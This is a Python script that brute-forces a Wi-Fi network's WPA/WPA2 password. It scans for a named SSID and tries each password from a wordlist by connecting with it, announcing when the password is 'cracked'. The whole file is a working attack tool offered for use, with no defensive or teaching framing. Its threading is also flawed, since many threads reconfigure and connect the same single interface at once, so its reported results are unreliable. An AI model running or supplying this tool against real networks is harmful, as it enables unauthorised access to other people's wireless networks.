import argparse
import pywifi
from pywifi import const
import time
import threading

def hack_wifi(ssid, path_to_file):
    print("Starting WiFi hack process...")
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]

    print("Scanning for WiFi networks...")
    interface.scan()
    time.sleep(3)  # Wait for the scan to complete
    scan_results = interface.scan_results()

    print(f"Found {len(scan_results)} networks.")
    for network in scan_results:
        print(f"Network found: {network.ssid}")
        if network.ssid == ssid:
            bssid = network.bssid
            print(f"Target network {ssid} found with BSSID {bssid}.")
            break
    else:
        print(f"Network {ssid} not found")
        return

    try:
        with open(path_to_file, 'r') as file:
            passwords = [line.strip() for line in file]
            threads = []

            for password in passwords:
                thread = threading.Thread(target=try_password, args=(interface, ssid, bssid, password))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

    except FileNotFoundError:
        print(f"File not found: {path_to_file}")
    except OSError as e:
        print(f"Error opening file {path_to_file}: {e}")

def try_password(interface, ssid, bssid, password):
    print(f"Trying password: {password}")
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.bssid = bssid
    profile.key = password
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.akm.append(const.AKM_TYPE_WPAPSK)  # Adding WPA-PSK support
    profile.cipher = const.CIPHER_TYPE_CCMP

    interface.remove_all_network_profiles()
    temp_profile = interface.add_network_profile(profile)
    interface.connect(temp_profile)
    time.sleep(5)  # Wait for the connection to attempt

    if interface.status() == const.IFACE_CONNECTED:
        print(f"WiFi password cracked: {password}")
        return True
    else:
        interface.disconnect()
        time.sleep(1)
        print("Password incorrect, trying next...")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--ssid", help="WiFi network SSID")
    parser.add_argument("-w", "--wordlist", help="Path to password list file")
    args = parser.parse_args()

    print(f"SSID: {args.ssid}")
    print(f"Wordlist Path: {args.wordlist}")

    if args.ssid and args.wordlist:
        hack_wifi(args.ssid, args.wordlist)
    else:
        print("Please provide both SSID and wordlist path.")